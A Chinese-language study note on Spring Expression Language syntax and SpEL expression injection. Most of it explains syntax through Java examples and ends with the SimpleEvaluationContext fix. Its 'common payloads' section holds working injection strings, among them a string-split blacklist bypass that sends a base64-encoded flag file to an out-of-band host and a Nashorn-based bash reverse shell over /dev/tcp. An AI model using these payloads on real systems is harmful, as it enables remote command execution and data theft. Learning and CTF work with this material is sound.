categories:
- web
tags:
- SpEL
- 学习笔记
title: SpEL表达式注入漏洞
---
# SpEL表达式注入漏洞

## 简介

Spring Expression Language（简称SpEL）。SpEL引擎作为Spring 组合里的表达式解析的基础 ，但它不直接依赖于Spring,可独立使用。 



## SpEL测试代码

```java
ExpressionParser parser = new SpelExpressionParser();
Expression exp = parser.parseExpression("'Hello World'");
//Expression randomPhrase = parser.parseExpression("123",new TemplateParserContext());
String message = (String) exp.getValue();
//String message = exp.getValue(String.class);

```

 上述代码含义为首先创建`ExpressionParser`解析表达式，之后放置表达式，最后通过`getValue`方法执行表达式，默认容器是spring本身的容器：`ApplicationContext`。 

`TemplateParserContext`添加了 **表达式模板** 解析器

## SpEL语法



### 使用SpEL接口进行表达式求值

```java
ExpressionParser parser = new SpelExpressionParser();
Expression exp = parser.parseExpression("'Hello World'");
String message = (String) exp.getValue();
```



###  方法调用，访问属性，调用构造函数

这些都和平时的java没什么不同,demo:

访问属性：

```java
ExpressionParser parser = new SpelExpressionParser();
Expression exp = parser.parseExpression("'123'.bytes");
System.out.println((Object)exp.getValue());
```

方法调用：

```java
ExpressionParser parser = new SpelExpressionParser();
Expression exp = parser.parseExpression("'123'.length()");
System.out.println((Object)exp.getValue());
```

调用构造函数：

```java
ExpressionParser parser = new SpelExpressionParser();
Expression exp = parser.parseExpression("new String(1234)");
System.out.println((Object)exp.getValue());
```



### 访问根对象属性方法等



```java
ExpressionParser parser = new SpelExpressionParser();
    	Expression exp = parser.parseExpression("fucker+tou()");
    	System.out.println((Object)exp.getValue(new Object(){
    	    public String fucker="fucker";
    	    public String tou(){
    	        return "toutoutou";
    	    };
    	}));
```

结果：`fuckertoutoutou`



### 传递根对象/#root

#### StandardEvaluationContext



```java
// Create and set a calendar
GregorianCalendar c = new GregorianCalendar();
c.set(1856, 7, 9);

// The constructor arguments are name, birthday, and nationality.
Inventor tesla = new Inventor("Nikola Tesla", c.getTime(), "Serbian");

ExpressionParser parser = new SpelExpressionParser();
Expression exp = parser.parseExpression("name");

EvaluationContext context = new StandardEvaluationContext(tesla);
String name = (String) exp.getValue(context);
```

这里的root object 是 tesla,`parser.parseExpression("name");`会返回tesla的name属性

#### getValue

```java
// Create and set a calendar
GregorianCalendar c = new GregorianCalendar();
c.set(1856, 7, 9);

// The constructor arguments are name, birthday, and nationality.
Inventor tesla = new Inventor("Nikola Tesla", c.getTime(), "Serbian");

ExpressionParser parser = new SpelExpressionParser();
Expression exp = parser.parseExpression("name");
String name = (String) exp.getValue(tesla);
```



### 数组和列表和字典 取值

 属性名的第一个字母可以是大小写敏感的。数组和列表的内容可以使用方括号来标记 

```java
ExpressionParser parser = new SpelExpressionParser();

// Inventions Array
StandardEvaluationContext teslaContext = new StandardEvaluationContext(tesla);

// evaluates to "Induction motor"
String invention = parser.parseExpression("inventions[3]").getValue(
		teslaContext, String.class);

// Members List
StandardEvaluationContext societyContext = new StandardEvaluationContext(ieee);

// evaluates to "Nikola Tesla"
String name = parser.parseExpression("Members[0].Name").getValue(
		societyContext, String.class);

// List and Array navigation
// evaluates to "Wireless communication"
String invention = parser.parseExpression("Members[0].Inventions[6]").getValue(
		societyContext, String.class);
```

 Maps的值由方括号内指定字符串的Key来标识引用。在下面这个例子中，因为Officers map的Key是string类型，我们可以用过字符串常量指定。 

```java
// Officer's Dictionary

Inventor pupin = parser.parseExpression("Officers['president']").getValue(
		societyContext, Inventor.class);

// evaluates to "Idvor"
String city = parser.parseExpression("Officers['president'].PlaceOfBirth.City").getValue(
		societyContext, String.class);

// setting values
parser.parseExpression("Officers['advisors'][0].PlaceOfBirth.Country").setValue(
		societyContext, "Croatia");
```



### 声明数组列表和字典

列表：

```java
// evaluates to a Java list containing the four numbers
List numbers = (List) parser.parseExpression("{1,2,3,4}").getValue(context);

List listOfLists = (List) parser.parseExpression("{{'a','b'},{'x','y'}}").getValue(context);
```



字典：

```java
// evaluates to a Java map containing the two entries
Map inventorInfo = (Map) parser.parseExpression("{name:'Nikola',dob:'10-July-1856'}").getValue(context);

Map mapOfMaps = (Map) parser.parseExpression("{name:{first:'Nikola',last:'Tesla'},dob:{day:10,month:'July',year:1856}}").getValue(context);
```



数组：

 数组可以使用类似于Java的语法创建，创建时可以事先指定数组的容量大小、这个是可选的。 在创建多维数组时还不支持事先指定初始化的值。

```java
int[] numbers1 = (int[]) parser.parseExpression("new int[4]").getValue(context);
```

### T操作符

`T()`运算符会调用类作用域的方法和常量。 

 T操作符是一个特殊的操作符、可以同于指定java.lang.Class的实例（类型）。静态方法也可以通过这个操作符调用。  **T()引用java.lang包里面的类型不需要限定包全名，但是其他类型的引用必须要。 **

```java
Class dateClass = parser.parseExpression("T(java.util.Date)").getValue(Class.class);

Class stringClass = parser.parseExpression("T(String)").getValue(Class.class);

boolean trueValue = parser.parseExpression(
		"T(java.math.RoundingMode).CEILING >= T(java.math.RoundingMode).FLOOR")
		.getValue(Boolean.class);
```







### 表达式模板

 表达式模板运行在一段文本中混合包含一个或多个求值表达式模块。各个求值块都通过可被自定义的前后缀字符分隔，一个通用的选择是使用#{ }作为分隔符。 

```java
String randomPhrase = parser.parseExpression(
		"random number is #{T(java.lang.Math).random()}",
		new TemplateParserContext()).getValue(String.class);
```

结果：`random number is xxxx`



### 变量

 表达式中的变量可以通过语法#变量名使用。变量可以在StandardEvaluationContext中通过方法setVariable设置。 



#### this和root变量

 \#this变量永远指向当前表达式正在求值的对象（这时不需要限定全名）。变量#root总是指向根上下文对象。#this在表达式不同部分解析过程中可能会改变，但是#root总是指向根 



### 易错点

T()和new一个类时 除了java.lang下的类，其他类都要需要需要限定包全名



## SpEL导致的任意命令执行

### 常用payload

```
T(java.lang.Runtime).getRuntime().exec("nslookup a.com")
T(Thread).sleep(10000)
#this.getClass().forName('java.lang.Runtime').getRuntime().exec('nslookup a.com')
new java.lang.ProcessBuilder({'nslookup a.com'}).start()
```



利用反射构造绕过黑名单

```
#{T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("ex"+"ec",T(String[])).invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("getRu"+"ntime").invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime")),new String[]{"/bin/bash","-c","curl fg5hme.ceye.io/`cat flag_j4v4_chun|base64|tr '\n' '-'`"})}
```



利用ScriptEngineManager构造绕过黑名单

```java
#{T(javax.script.ScriptEngineManager).newInstance()
    .getEngineByName("nashorn")
        .eval("s=[3];s[0]='/bin/bash';s[1]='-c';s[2]='ex"+"ec 5<>/dev/tcp/1.2.3.4/2333;cat <&5 | while read line; do $line 2>&5 >&5; done';java.la"+"ng.Run"+"time.getRu"+"ntime().ex"+"ec(s);")}
```



```
''['class'].forName('java.lang.Runtime').getDeclaredMethods()[15]
    .invoke(''['class'].forName('java.lang.Runtime').getDeclaredMethods()[7]
        .invoke(null),'curl 172.17.0.1:9898')
```

 除此以外当执行的系统命令被过滤或者被URL编码掉时我们可以通过`String`类动态生成字符
如要执行的命令为`open /Applications/Calculator.app`我们可以采用`new java.lang.String(new byte[]{,,...})`或者`concat(T(java.lang.Character).toString())`嵌套来绕过 

```
T(SomeWhitelistedClassNotPartOfJDK).ClassLoader.loadClass("jdk.jshell.JShell",true).Methods[6].invoke(null,{}).eval('whatever java code in one statement').toString()
```



### 一些技巧

#### new被过滤

可以用NEW



### 一些相关的ctf题目

#### de1ctf2020 cal





### SpEL提供的两个`EvaluationContext`的区别

SpEL提供的两个`EvaluationContext`的区别。
（EvaluationContext评估表达式以解析属性，方法或字段并帮助执行类型转换时使用该接口。有两个开箱即用的实现。）

- SimpleEvaluationContext - 针对不需要SpEL语言语法的全部范围并且应该受到有意限制的表达式类别，公开SpEL语言特性和配置选项的子集。
- StandardEvaluationContext - 公开全套SpEL语言功能和配置选项。您可以使用它来指定默认的根对象并配置每个可用的评估相关策略。

`SimpleEvaluationContext`旨在仅支持SpEL语言语法的一个子集。它不包括 Java类型引用，构造函数和bean引用。

所以说指定正确`EvaluationContext`，是防止SpEl表达式注入漏洞产生的首选，之前出现过相关的SpEL表达式注入漏洞，其修复方式就是使用`SimpleEvaluationContext`替代`StandardEvaluationContext`。





## 参考文章

 http://rui0.cn/archives/1043 

 http://ifeve.com/spring-6-spel/  文档